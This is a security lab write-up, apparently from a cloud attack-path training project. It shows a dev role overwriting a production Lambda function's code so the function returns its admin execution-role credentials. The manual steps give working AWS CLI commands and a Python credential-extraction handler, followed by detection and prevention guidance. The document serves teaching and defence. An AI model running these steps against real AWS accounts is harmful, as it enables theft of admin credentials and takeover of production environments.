# Cross-Account Lambda Function Code Update Attack

* **Category:** Privilege Escalation
* **Sub-Category:** privilege-chaining
* **Path Type:** cross-account
* **Target:** to-admin
* **Environments:** dev, prod
* **Cost Estimate:** $0/mo
* **Technique:** Cross-account Lambda function code injection to extract admin credentials
* **Terraform Variable:** `enable_cross_account_dev_to_prod_multi_hop_lambda_invoke_update`
* **Schema Version:** 1.0.0
* **Attack Path:** starting_user_dev → (AssumeRole) → dev_lambda_role → (lambda:UpdateFunctionCode cross-account) → prod_lambda → (credential extraction) → prod_lambda_execution_role (admin)
* **Attack Principals:** `arn:aws:iam::{dev_account_id}:user/pl-pathfinding-starting-user-dev`; `arn:aws:iam::{dev_account_id}:role/pl-dev-lambda-invoke-role`; `arn:aws:lambda:{region}:{prod_account_id}:function:pl-prod-hello-world`; `arn:aws:iam::{prod_account_id}:role/pl-prod-lambda-execution-role`
* **Required Permissions:** `lambda:UpdateFunctionCode` on `arn:aws:lambda:*:{prod_account_id}:function/*`; `lambda:InvokeFunction` on `arn:aws:lambda:*:{prod_account_id}:function/*`
* **Helpful Permissions:** `lambda:ListFunctions` (Discover Lambda functions in prod account); `lambda:GetFunction` (View Lambda function configuration and role)
* **MITRE Tactics:** TA0004 - Privilege Escalation, TA0006 - Credential Access, TA0008 - Lateral Movement
* **MITRE Techniques:** T1078.004 - Valid Accounts: Cloud Accounts, T1648 - Serverless Execution, T1552.005 - Cloud Instance Metadata API

## Attack Overview

This module demonstrates a cross-account privilege escalation attack where a dev role can update and invoke a prod Lambda function to extract credentials from the Lambda execution role.

The attack path shows how a dev role with Lambda invoke and update permissions can modify a prod Lambda function to extract credentials and gain administrative access to the prod account. This is a critical cross-account vulnerability because it allows code injection into prod Lambda functions, and Lambda execution roles often have high privileges. The attack appears as normal Lambda function operations, making it stealthy relative to more overt IAM manipulation techniques.

This configuration appears in real environments when shared-service Lambda functions are deployed in prod but managed by dev teams, or when cross-account CI/CD pipelines are granted broad Lambda permissions without scoping to specific deployment functions.

### MITRE ATT&CK Mapping

- **Tactics**: TA0004 - Privilege Escalation, TA0006 - Credential Access, TA0008 - Lateral Movement
- **Techniques**: T1078.004 - Valid Accounts: Cloud Accounts, T1648 - Serverless Execution, T1552.005 - Cloud Instance Metadata API

### Principals in the attack path

- `arn:aws:iam::{DEV_ACCOUNT}:user/pl-pathfinding-starting-user-dev` (dev starting user; initial access point)
- `arn:aws:iam::{DEV_ACCOUNT}:role/pl-dev-lambda-invoke-role` (dev role with cross-account Lambda permissions)
- `arn:aws:lambda:{REGION}:{PROD_ACCOUNT}:function:pl-prod-hello-world` (prod Lambda function; target for code injection)
- `arn:aws:iam::{PROD_ACCOUNT}:role/pl-prod-lambda-execution-role` (prod Lambda execution role with AdministratorAccess)

### Attack Path Diagram

```mermaid
graph LR
    %% Nodes
    DevUser[dev:iam:pl-pathfinding-starting-user-dev]
    DevRole[dev:iam:pl-dev-lambda-invoke-role]
    ProdLambda[prod:lambda:pl-prod-hello-world]
    LambdaRole[prod:iam:pl-prod-lambda-execution-role]
    AdminAccess[prod:admin:full-access]

    %% Edges
    DevUser -->|sts:AssumeRole| DevRole
    DevRole -->|lambda:UpdateFunctionCode| ProdLambda
    DevRole -->|lambda:InvokeFunction| ProdLambda
    ProdLambda -->|uses| LambdaRole
    LambdaRole -->|admin:full-access| AdminAccess

    %% Styling
    classDef startNode fill:#ff9999,stroke:#333,stroke-width:2px
    classDef intermediateNode fill:#ffcc99,stroke:#333,stroke-width:2px
    classDef targetNode fill:#99ff99,stroke:#333,stroke-width:2px

    class DevUser startNode
    class DevRole,ProdLambda intermediateNode
    class LambdaRole,AdminAccess targetNode
```



### Attack Steps

1. **Initial Access**: Dev user `pl-pathfinding-starting-user-dev` authenticates in the dev account
2. **Hop 1 - Role Assumption**: Dev user assumes the `pl-dev-lambda-invoke-role` in the dev account via `sts:AssumeRole`
3. **Hop 2 - Function Update**: The dev role uses `lambda:UpdateFunctionCode` to replace the prod Lambda function code with credential-extracting malicious code
4. **Hop 2 - Function Invocation**: The dev role uses `lambda:InvokeFunction` to execute the malicious code in the prod Lambda function
5. **Credential Extraction**: The malicious Lambda function extracts its execution role credentials from the Lambda runtime environment
6. **Admin Access**: The extracted credentials for `pl-prod-lambda-execution-role` provide full administrative access to the prod account
7. **Verification**: Run `aws sts get-caller-identity` with the extracted credentials to confirm admin access in prod

### Scenario specific resources created

| ARN | Purpose |
|-----|---------|
| `arn:aws:iam::{DEV_ACCOUNT}:role/pl-dev-lambda-invoke-role` | Dev role with cross-account Lambda invoke and update permissions |
| `arn:aws:lambda:{REGION}:{PROD_ACCOUNT}:function:pl-prod-hello-world` | Prod Lambda function vulnerable to code injection |
| `arn:aws:iam::{PROD_ACCOUNT}:role/pl-prod-lambda-execution-role` | Prod Lambda execution role with AdministratorAccess |

## Attack Lab

### Prerequisites

1. Install the `plabs` CLI:
   ```bash
   brew install pathfinding-labs/tap/plabs
   ```
2. Configure your AWS profiles in `~/.plabs/plabs.yaml` (or run `plabs init` if you haven't already)

### Deploy with plabs non-interactive

```bash
plabs enable enable_cross_account_dev_to_prod_multi_hop_lambda_invoke_update
plabs apply
```

### Deploy with plabs tui

1. Launch the TUI: `plabs`
2. Navigate to this scenario in the scenarios list
3. Press `space` to enable it
4. Press `d` to deploy

### Executing the automated demo_attack script

The script will:

1. Assume the dev Lambda invoke role (`pl-dev-lambda-invoke-role`) in the dev account
2. Discover the prod Lambda function (`pl-prod-hello-world`)
3. Create malicious Python code for credential extraction
4. Update the prod Lambda function with the malicious code using `lambda:UpdateFunctionCode`
5. Invoke the malicious function using `lambda:InvokeFunction`
6. Display the extracted prod Lambda execution role credentials and confirm admin access

#### Resources created by attack script

- Temporary malicious Lambda deployment package (zip file on disk, removed after upload)
- Modified prod Lambda function code (restored by cleanup script)

#### With plabs non-interactive

```bash
plabs demo --list
plabs demo lambda-invoke-update
```

#### With plabs tui

1. Launch the TUI: `plabs`
2. Navigate to this scenario in the scenarios list
3. Press `r` to run the demo script

### Executing the attack manually

**Step 1: Assume the dev Lambda invoke role**

```bash
# Configure dev account credentials first
export AWS_PROFILE=dev

CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::DEV_ACCOUNT:role/pl-dev-lambda-invoke-role \
  --role-session-name attack-session \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.Credentials.SessionToken')
unset AWS_PROFILE
```

**Step 2: Discover the prod Lambda function**

```bash
aws lambda list-functions \
  --region us-east-1 \
  --query 'Functions[?starts_with(FunctionName, `pl-prod-hello-world`)].{Name:FunctionName,Role:Role}'
```

**Step 3: Create and upload malicious function code**

```bash
# Create malicious code that extracts credentials
cat > /tmp/lambda_function.py << 'EOF'
import boto3
import json

def lambda_handler(event, context):
    session = boto3.Session()
    credentials = session.get_credentials()
    cred_data = {
        'access_key_id': credentials.access_key,
        'secret_access_key': credentials.secret_key,
        'session_token': credentials.token,
    }
    return {'statusCode': 200, 'body': json.dumps(cred_data)}
EOF

# Package and upload
cd /tmp && zip malicious_lambda.zip lambda_function.py

FUNCTION_NAME=$(aws lambda list-functions --region us-east-1 \
  --query 'Functions[?starts_with(FunctionName, `pl-prod-hello-world`)].FunctionName' \
  --output text)

aws lambda update-function-code \
  --function-name "$FUNCTION_NAME" \
  --zip-file fileb:///tmp/malicious_lambda.zip \
  --region us-east-1
```

**Step 4: Invoke the malicious function and extract credentials**

```bash
aws lambda invoke \
  --function-name "$FUNCTION_NAME" \
  --region us-east-1 \
  --payload '{}' \
  /tmp/response.json

cat /tmp/response.json | jq -r '.body | fromjson'
```

**Step 5: Verify admin access in prod**

```bash
# Export the extracted credentials
RESPONSE=$(cat /tmp/response.json | jq -r '.body | fromjson')
export AWS_ACCESS_KEY_ID=$(echo $RESPONSE | jq -r '.access_key_id')
export AWS_SECRET_ACCESS_KEY=$(echo $RESPONSE | jq -r '.secret_access_key')
export AWS_SESSION_TOKEN=$(echo $RESPONSE | jq -r '.session_token')

aws sts get-caller-identity
```

### Cleanup

#### With plabs non-interactive

```bash
plabs cleanup --list
plabs cleanup lambda-invoke-update
```

#### With plabs tui

1. Launch the TUI: `plabs`
2. Navigate to this scenario in the scenarios list
3. Press `c` to run the cleanup script

### Teardown with plabs non-interactive

```bash
plabs disable enable_cross_account_dev_to_prod_multi_hop_lambda_invoke_update
plabs apply
```

### Teardown with plabs tui

1. Launch the TUI: `plabs`
2. Navigate to this scenario in the scenarios list
3. Press `space` to disable it
4. Press `D` to destroy

## Detecting Misconfiguration (CSPM)

### What CSPM tools should detect

- Dev account IAM role (`pl-dev-lambda-invoke-role`) has `lambda:UpdateFunctionCode` permission on prod account Lambda functions — this is a cross-account code injection vector
- Dev account IAM role has `lambda:InvokeFunction` permission on prod account Lambda functions with no condition restricting invocation context
- Prod Lambda function (`pl-prod-hello-world`) has a resource policy granting the entire dev account (`arn:aws:iam::DEV_ACCOUNT:root`) the ability to invoke and update function code
- Prod Lambda execution role (`pl-prod-lambda-execution-role`) has `AdministratorAccess` attached — high-privilege execution role reachable via code injection
- Cross-account Lambda resource policy allows broad principal (`*` or `:root`) rather than a specific role ARN

### Prevention recommendations

- **Principle of Least Privilege**: Avoid granting `lambda:UpdateFunctionCode` to cross-account principals; restrict Lambda update permissions to CI/CD pipeline roles with narrow scope conditions
- **Cross-Account Restrictions**: Scope Lambda resource policies to a specific trusted role ARN (e.g., `arn:aws:iam::DEV_ACCOUNT:role/ci-deploy-role`) rather than the entire dev account root
- **Resource Policy Auditing**: Regularly audit Lambda resource policies using `aws lambda get-policy` and alert on policies granting broad cross-account access
- **Execution Role Restrictions**: Limit Lambda execution role permissions to only what the function needs; never attach `AdministratorAccess` to a Lambda execution role
- **Code Review and Signing**: Implement Lambda code signing with AWS Signer to prevent unauthorized code from being deployed
- **Monitoring**: Alert on `Lambda: UpdateFunctionCode20150331v2` events, especially when the caller is from a different account than the function

## Detection Abuse (CloudSIEM)

### CloudTrail events to monitor

- `STS: AssumeRole` — Dev user assumes the `pl-dev-lambda-invoke-role`; monitor cross-account role assumptions from dev to roles with Lambda permissions
- `Lambda: UpdateFunctionCode20150331v2` — Lambda function code modified cross-account; high severity when caller account differs from function account
- `Lambda: Invoke` — Lambda function invoked shortly after a code update; correlate with `UpdateFunctionCode` events from the same session
- `STS: GetCallerIdentity` — Often called to confirm identity after credential extraction; monitor for calls using Lambda execution role temporary credentials from unexpected source IPs

### Detonation logs

_Detonation log integration (Stratus Red Team / Grimoire) is planned for a future release._
